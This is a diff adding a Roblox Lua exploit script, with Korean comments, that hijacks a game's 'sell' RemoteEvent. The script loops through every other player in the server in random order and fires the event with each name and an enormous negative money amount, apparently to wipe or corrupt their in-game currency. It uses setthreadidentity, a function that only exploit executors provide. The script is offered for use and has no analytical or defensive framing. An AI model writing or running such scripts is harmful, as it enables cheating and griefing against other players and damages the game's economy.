@@ -1,0 +1,64 @@
+local Players = game:GetService("Players")
+
+-- 리모트 이벤트 경로 설정
+local RemoteEvent = Players.LocalPlayer:WaitForChild("PlayerGui")
+    :WaitForChild("up1_new1_moneysend2022_BudungStudio. (StarterGui)")
+    :WaitForChild("sell")
+    :WaitForChild("sell")
+    :WaitForChild("RemoteEvent")
+
+-- 플레이어 리스트 섞기 함수
+local function shuffle(tbl)
+	local newTbl = {}
+	for i, v in ipairs(tbl) do
+		newTbl[i] = v
+	end
+	for i = #newTbl, 2, -1 do
+		local j = math.random(1, i)
+		newTbl[i], newTbl[j] = newTbl[j], newTbl[i]
+	end
+	return newTbl
+end
+
+-- 작업한 플레이어 기록
+local usedPlayers = {}
+
+-- 실행 루프
+while true do
+	local players = Players:GetPlayers()
+	local availablePlayers = {}
+
+	-- 아직 안 쓴 플레이어만 넣기
+	for _, player in ipairs(players) do
+		if not usedPlayers[player.Name] and player ~= Players.LocalPlayer then
+			table.insert(availablePlayers, player)
+		end
+	end
+
+	if #availablePlayers == 0 then
+		warn("모든 플레이어에게 완료됨")
+		break
+	end
+
+	-- 셔플해서 랜덤 선택
+	local shuffled = shuffle(availablePlayers)
+	local chosen = shuffled[1]
+
+	-- 수정된 리모트 호출 인자
+	local args = {
+		chosen.Name, -- 돈 받을 플레이어 이름 (문자열)
+		"-99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",      -- 금액 (문자열)
+		""           -- 추가 메시지
+	}
+
+	-- 리모트 이벤트 실행
+	RemoteEvent:FireServer(unpack(args))
+
+	print("전송됨:", chosen.Name)
+	usedPlayers[chosen.Name] = true
+
+	task.wait(0.01)
+end
+
+-- setthreadidentity(9)
+setthreadidentity(7)
